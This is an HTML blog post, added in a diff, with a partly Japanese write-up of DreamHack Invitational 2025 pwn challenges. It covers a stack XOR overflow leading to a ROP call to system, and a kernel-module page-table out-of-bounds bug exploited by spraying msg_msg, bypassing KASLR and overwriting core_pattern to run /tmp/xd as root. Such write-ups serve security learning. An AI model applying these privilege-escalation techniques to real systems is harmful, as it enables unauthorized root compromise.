@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <title>Writeup of DreamHack Invitational 2025 | House-of-Rona</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://blog.rqda.wtf/style.css">
+    <link rel="stylesheet" href="https://blog.rqda.wtf/color/green-auto.css">
+
+        <link rel="stylesheet" href="https://blog.rqda.wtf/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://blog.rqda.wtf/font-hack-subset.css">
+
+        <link rel="shortcut icon" type="image/png" href="/images/favicon.png">
+    
+<link rel="stylesheet" href="https://blog.rqda.wtf/footnote.css">
+<link rel="stylesheet" href="https://blog.rqda.wtf/page.css">
+<link rel="stylesheet" href="https://www.nerdfonts.com/assets/css/webfont.css">
+
+<meta name="google-site-verification" content="I4O4hRvGX4CkU3wvuZTczjjZFLuG3YINxBvx2be_tHY">
+<link rel="stylesheet" href="https://blog.rqda.wtf/icon.css">
+
+<meta property="og:title" content="Writeup of DreamHack Invitational 2025 | House-of-Rona">
+<meta property="og:image" content="https://github.com/rqdaA.png">
+<meta name="twitter:site" content="@907903">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Writeup of DreamHack Invitational 2025 | House-of-Rona">
+<meta name="twitter:image" content="https://github.com/rqdaA.png">
+<meta property="author" content="Rona (rqdaA)">
+<meta property="description" content="Brief writeup of DreamHack Invitational 2025">
+<meta property="og:description" content="Brief writeup of DreamHack Invitational 2025">
+
+
+</head>
+
+<body class="">
+<div class="container">
+    
+<header class="header">
+    <div class="header__inner">
+        <div class="header__logo">
+            
+            <img src="https://github.com/rqdaA.png" alt="">
+            
+            
+            <a href="https://blog.rqda.wtf" style="text-decoration: none;">
+                <div class="logo">
+                    
+                    House-of-Rona
+                    
+                </div>
+            </a>
+        </div>
+    </div>
+
+    
+    <nav class="menu">
+            <ul class="menu__inner">
+                <li><a href="https://blog.rqda.wtf/tags"><i class='nf nf-oct-tag'></i>tags</a></li>
+            
+                <li><a href="https://blog.rqda.wtf/about"><i class='nf nf-dev-github_alt'></i>whoami</a></li>
+            
+                <li><a href="https://github.com/rqdaA" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-github_inverted'></i>github</a></li>
+            
+                <li><a href="https://twitter.com/907903" target="_blank" rel="noopener noreferrer"><i class='nf nf-cod-twitter'></i>twitter</a></li>
+            </ul>
+        </nav>
+    
+    
+    
+</header>
+
+
+    <div class="content">
+        
+<div class="post">
+    
+    <h1 class="post-title"><a href="https://blog.rqda.wtf/dreamhack-inv-2025/">Writeup of DreamHack Invitational 2025</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2025-04-09
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/rop/">#ROP</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/heap/">#heap</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/kernel/">#kernel</a>&nbsp;
+                <a class="post-tag" href="https://blog.rqda.wtf/tags/pwn/">#pwn</a></span>
+    
+
+    
+    <h1>Table of Content</h1>
+    <ul>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/dreamhack-inv-2025/#xoronly">xoronly</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/dreamhack-inv-2025/#challenge">challenge</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/dreamhack-inv-2025/#exploit">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/dreamhack-inv-2025/#kidheap">kidheap</a>
+            
+        </li>
+        
+        <li>
+            <a href="https://blog.rqda.wtf/dreamhack-inv-2025/#ainque">ainque</a>
+            
+            <ul>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/dreamhack-inv-2025/#vulnerability">vulnerability</a>
+                </li>
+                
+                <li>
+                    <a href="https://blog.rqda.wtf/dreamhack-inv-2025/#exploit-1">exploit</a>
+                </li>
+                
+            </ul>
+            
+        </li>
+        
+    </ul>
+    <hr>
+    
+
+    
+        <div class="post-content">
+            <h1 id="xoronly">xoronly</h1>
+<p>stack上に無限に書き込むことができます。書き込みは既にある値とxorが取られれます。xor後の文字列は<code>puts</code>されます。</p>
+<h2 id="challenge">challenge</h2>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span>()
+</span><span>{
+</span><span>    </span><span style="color:#b48ead;">char</span><span> buf[</span><span style="color:#d08770;">0x100</span><span>] = {</span><span style="color:#d08770;">0</span><span>,};
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">setvbuf</span><span>(stdin, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">2</span><span>, </span><span style="color:#d08770;">0</span><span>);
+</span><span>    </span><span style="color:#96b5b4;">setvbuf</span><span>(stdout, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">2</span><span>, </span><span style="color:#d08770;">0</span><span>);
+</span><span>    </span><span style="color:#96b5b4;">setvbuf</span><span>(stderr, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">2</span><span>, </span><span style="color:#d08770;">0</span><span>);
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Welcome to the XOR-only encryption service!</span><span>&quot;);
+</span><span>    </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">We will encrypt your data with a single byte key.</span><span>&quot;);
+</span><span>    </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Please enter your data</span><span>&quot;);
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">while</span><span>(</span><span style="color:#d08770;">1</span><span>)
+</span><span>    {
+</span><span>        </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">&gt; </span><span>&quot;);
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">for</span><span>(</span><span style="color:#b48ead;">int</span><span> i=</span><span style="color:#d08770;">0</span><span>;; i++)
+</span><span>        {
+</span><span>            </span><span style="color:#b48ead;">char</span><span> c = </span><span style="color:#96b5b4;">getchar</span><span>();
+</span><span>            </span><span style="color:#b48ead;">if</span><span>(c == &#39;</span><span style="color:#96b5b4;">\n</span><span>&#39;)
+</span><span>            {
+</span><span>                buf[i] = </span><span style="color:#d08770;">0</span><span>;
+</span><span>                </span><span style="color:#b48ead;">break</span><span>;
+</span><span>            }
+</span><span>            </span><span style="color:#b48ead;">if</span><span>(!</span><span style="color:#96b5b4;">isalnum</span><span>(c))
+</span><span>            {
+</span><span>                </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Invalid character detected!</span><span>&quot;);
+</span><span>                </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span>;
+</span><span>            }
+</span><span>            buf[i] ^= c;
+</span><span>        }
+</span><span>
+</span><span>        </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Here is your encrypted data: </span><span>&quot;);
+</span><span>        </span><span style="color:#96b5b4;">puts</span><span>(buf);
+</span><span>    }
+</span><span>}
+</span></code></pre>
+<h2 id="exploit">exploit</h2>
+<h3 id="aslr-leak">aslr leak</h3>
+<p><code>__libc_start_main</code>のアドレスを<code>puts(buf)</code>でleakします。</p>
+<h3 id="rop">ROP</h3>
+<p><code>[0x00, 0-9, A-z]</code>が入力できて、xorすることができるので、<code>0 - 0x7f</code>までの任意の数値を作り出せます。
+後はlibcのアドレスが<code>0x00 - 0x7f</code>までで構成されるアドレスになるまで接続を繰り返すことで、<code>pop rdi; system</code>のROPをします。</p>
+<h1 id="kidheap">kidheap</h1>
+<p>WIP</p>
+<h1 id="ainque">ainque</h1>
+<p>The provided kernel module can load riscv ELF binary and run it in kernel context.</p>
+<h2 id="vulnerability">vulnerability</h2>
+<p><code>pml4e_index</code> has no validation. It can exceed 0x200, which cause OOB access. </p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">static</span><span> QCPU_EXIT_TYPE </span><span style="color:#8fa1b3;">write_memory</span><span>(qvm_t *</span><span style="color:#bf616a;">qvm</span><span>, uint64_t </span><span style="color:#bf616a;">va</span><span>, uint64_t </span><span style="color:#bf616a;">size</span><span>, uint64_t </span><span style="color:#bf616a;">value</span><span>, </span><span style="color:#b48ead;">bool </span><span style="color:#bf616a;">is_signed</span><span>) {
+</span><span>    </span><span style="color:#b48ead;">for</span><span>(</span><span style="color:#b48ead;">int</span><span> i=</span><span style="color:#d08770;">0</span><span>; i&lt;size; i++) {
+</span><span>        qcpu_pte_or_fail pte_safe = </span><span style="color:#bf616a;">qcpu_get_pte_from_va_failsafe</span><span>(qvm-&gt;qcpu.</span><span style="color:#bf616a;">cr3</span><span>, va+i);
+</span><span>        </span><span style="color:#b48ead;">if</span><span>(pte_safe.</span><span style="color:#bf616a;">success</span><span>) {
+</span><span>            ((uint8_t *)</span><span style="color:#bf616a;">PTE_TO_PHYS</span><span>(pte_safe.</span><span style="color:#bf616a;">pte</span><span>))[(va+i) &amp; </span><span style="color:#d08770;">0xfff</span><span>] = (uint8_t)((value &gt;&gt; (i*</span><span style="color:#d08770;">8</span><span>)) &amp; </span><span style="color:#d08770;">0xff</span><span>);
+</span><span>        } </span><span style="color:#b48ead;">else </span><span>{
+</span><span>            </span><span style="color:#b48ead;">return</span><span> QCPU_SIGSEGV;
+</span><span>        }
+</span><span>    }
+</span><span>    </span><span style="color:#b48ead;">return</span><span> QCPU_CONTINUE;
+</span><span>}
+</span></code></pre>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>qcpu_pte_or_fail </span><span style="color:#8fa1b3;">qcpu_get_pte_from_va_failsafe</span><span>(qcpu_pte_t ****</span><span style="color:#bf616a;">cr3</span><span>, uint64_t </span><span style="color:#bf616a;">va</span><span>) {
+</span><span>    qcpu_pte_t ***pml4e = </span><span style="color:#bf616a;">qcpu_get_pml4e</span><span>(cr3, va &gt;&gt; </span><span style="color:#d08770;">39</span><span>);
+</span><span style="color:#65737e;">// the following omitted
+</span><span>
+</span><span>qcpu_pte_t ***</span><span style="color:#bf616a;">qcpu_get_pml4e</span><span>(qcpu_pte_t ****cr3, uint64_t pml4e_index)
+</span><span>{
+</span><span>    </span><span style="color:#b48ead;">return</span><span> cr3[pml4e_index];
+</span><span>}
+</span></code></pre>
+<h2 id="exploit-1">exploit</h2>
+<h3 id="kaslr-bypass">kaslr bypass</h3>
+<p>The basic strategy is spraying <code>msg_msg</code> and use it as <code>cr3</code>.
+<code>msg_msg</code> has <code>list_head</code> member, which has a valid pointer, they can be used as <code>pml4e</code> or <code>pdpe</code>.</p>
+<p>We can leak kbase by reading IDT region, which is located at fixed virtual address.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>  </span><span style="color:#65737e;">// VM side
+</span><span>  </span><span style="color:#b48ead;">unsigned long</span><span> gate = *(</span><span style="color:#b48ead;">long </span><span>*)</span><span style="color:#bf616a;">PTI_TO_VIRT</span><span>(</span><span style="color:#d08770;">0x2000 </span><span>+ </span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">6</span><span>, </span><span style="color:#d08770;">0</span><span>) &gt;&gt; </span><span style="color:#d08770;">52</span><span>;
+</span><span>  </span><span style="color:#b48ead;">unsigned long</span><span> kbase_diff = gate - </span><span style="color:#d08770;">0x820</span><span>;
+</span></code></pre>
+<p>To load crafted value as <code>pml4e</code>, spray a bunch of <code>msg_msg</code> struct after <code>QVM_LOAD</code>. It contains the all possible pointer (0x200) pointing to <code>&amp;core_pattern</code> considering KASLR.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>  </span><span style="color:#65737e;">// Host side
+</span><span>  </span><span style="color:#bf616a;">rep</span><span>(i, </span><span style="color:#d08770;">0x1f8</span><span>) {
+</span><span>    ((</span><span style="color:#b48ead;">unsigned long </span><span>*)msg_buf.</span><span style="color:#bf616a;">mtext</span><span>)[i + </span><span style="color:#d08770;">1</span><span>] =
+</span><span>    </span><span style="color:#d08770;">0xffffffff</span><span style="color:#b48ead;">lu </span><span>* </span><span style="color:#d08770;">0x100000
+</span><span>    | (i + </span><span style="color:#d08770;">0x82b</span><span style="color:#b48ead;">lu</span><span>) * </span><span style="color:#d08770;">0x100</span><span style="color:#b48ead;">lu  </span><span style="color:#65737e;">// KASLR bypass
+</span><span>    | </span><span style="color:#d08770;">0x7b
+</span><span>    | (</span><span style="color:#d08770;">0x8000000000000000</span><span style="color:#b48ead;">l</span><span>);
+</span><span>  }
+</span></code></pre>
+
+<div class="inserted_img">
+    <img src="https:&#x2F;&#x2F;blog.rqda.wtf&#x2F;processed_images&#x2F;pagetable.4a55090bc5dac5ad.png" alt=""/>
+    <p>IDT address and all possible kbase address</p></div>
+<h3 id="core-pattern-overwrite">core_pattern overwrite</h3>
+<p>By writing <code>|/tmp/xd</code> into <code>core_pattern</code> and causing crash, the kernel executes <code>/tmp/xd</code> as root.</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span>  </span><span style="color:#65737e;">// VM side
+</span><span>  *(</span><span style="color:#b48ead;">long </span><span>*)</span><span style="color:#bf616a;">PTI_TO_VIRT</span><span>(</span><span style="color:#d08770;">0x2000 </span><span>+ </span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">0</span><span>, </span><span style="color:#d08770;">7 </span><span>+ kbase_diff &amp; </span><span style="color:#d08770;">0xfff</span><span>, </span><span style="color:#d08770;">0xc20</span><span>) =
+</span><span>      0x64782f706d742f7c; </span><span style="color:#65737e;">// |/tmp/xd
+</span></code></pre>
+
+        </div>
+
+    
+        <div class="pagination">
+            <div class="pagination__title">
+                <span class="pagination__title-h">Other posts</span>
+                <hr />
+            </div>
+            <div class="pagination__buttons">
+                    <span class="button previous">
+                        <a href="https://blog.rqda.wtf/downunder-2024/">
+                            <span class="button__icon">←</span>&nbsp;
+                            <span class="button__text">DownUnderCTF 2024 | faulty kernel</span>
+                        </a>
+                    </span>
+                
+                </div>
+        </div>
+    
+</div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright copyright--user">&#169 2025 Rona 🐈</div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
